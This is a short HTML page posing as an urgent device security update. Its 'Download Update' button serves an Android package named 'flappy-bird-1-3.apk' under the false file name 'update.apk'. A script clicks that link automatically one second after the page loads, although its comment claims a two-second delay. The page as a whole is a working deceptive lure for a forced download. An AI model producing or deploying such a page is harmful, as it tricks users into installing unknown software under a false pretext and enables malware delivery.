<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Required</title>
</head>
<body>
    <h1>Your device needs an urgent security update</h1>
    <p>Please click the button below to update your device.</p>
    <a id="download" href="flappy-bird-1-3.apk" download="update.apk">
        <button>Download Update</button>
    </a>

    <script>
        // Auto-trigger the download after a short delay
        window.onload = function() {
            setTimeout(function() {
                document.getElementById("download").click();
            }, 1000);  // 2-second delay before automatic download
        };
    </script>
</body>
</html>
